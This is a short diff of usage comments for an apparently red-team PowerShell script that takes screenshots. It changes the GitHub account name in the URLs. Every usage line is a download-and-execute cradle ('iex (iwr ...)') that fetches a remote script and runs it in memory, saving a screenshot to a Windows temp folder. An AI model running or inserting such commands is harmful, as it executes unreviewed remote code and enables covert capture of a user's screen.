@@ -1,7 +1,7 @@
 # Usage:
-# iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);
+# iex (iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);
 # OR
-# powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);"
+# powershell.exe "iex (iwr https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);"
 # Default path: C:\Windows\Temp\test.png
 
 
